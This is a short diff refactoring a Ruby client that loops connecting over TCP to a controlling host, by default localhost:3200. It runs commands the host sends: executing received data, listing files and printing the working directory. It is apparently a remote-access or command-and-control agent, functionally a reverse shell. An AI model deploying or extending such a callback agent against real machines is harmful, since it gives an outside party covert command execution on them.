@@ -12,11 +12,7 @@ def handle_client(client)
     when 'heartbeat'
       result = 'alive'
     when 'exe'
-      begin
-        result = Helpers.exe(data)
-      rescue Exception => e
-        puts e.backtrace
-      end
+      result = Helpers.exe(data)
     when 'ls'
       result = Helpers.ls
     when 'pwd'
@@ -38,20 +34,14 @@ def handle_client(client)
 end
 
 
-def main(timeout)
-  host = ARGV[0]
-  port = ARGV[1]
-
-  # If host/port is not passed in ARGV, default to localhost:3200
-  host ||= "localhost"
-  port ||= 3200
-
+def main(host, port, timeout)
   # Main loop around handle_client loop to repeat attempt server connection
   loop do
     client = nil
     begin
       client = TCPSocket.new(host, port)
     rescue Exception => e
+      puts e.message
       puts e.backtrace
       sleep(timeout)
     end
@@ -62,14 +52,20 @@ def main(timeout)
     rescue Interrupt
       exit 0
     rescue Exception => e
+      puts e.message
       puts e.backtrace
     end
 
-    if exit_code == 42
-      exit 0
-    end
+  exit 0 if exit_code == 42
   end
 end
 
-TIMEOUT = 2
-main(TIMEOUT)
+host = ARGV[0]
+port = ARGV[1]
+
+# If host/port is not passed in ARGV, default to localhost:3200
+host ||= "localhost"
+port ||= 3200
+timeout = 2
+
+main(host, port, timeout)
